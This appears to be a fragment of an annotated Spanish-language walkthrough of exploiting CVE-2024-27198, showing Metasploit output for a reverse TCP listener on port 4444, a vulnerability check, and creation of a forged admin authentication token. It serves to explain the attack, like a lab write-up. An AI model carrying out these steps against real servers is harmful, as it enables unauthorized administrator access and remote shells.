...
[*] Started reverse TCP handler on 192.168.128.160:4444
Primero se abre el puerto en espera de conexión del objetivo.
------------------------------------------------------------------------------
...
Se confirma que el sistema es vulnerable al CVE-2024-27198.
------------------------------------------------------------------------------
FASE 3: CREACIÓN DE TOKEN ADMIN
[*] Created authentication token: eyJ0eXAiOiAiVENWMiJ9...
Genera el token JWT falso para autenticarse como administrador.
------------------------------------------------------------------------------
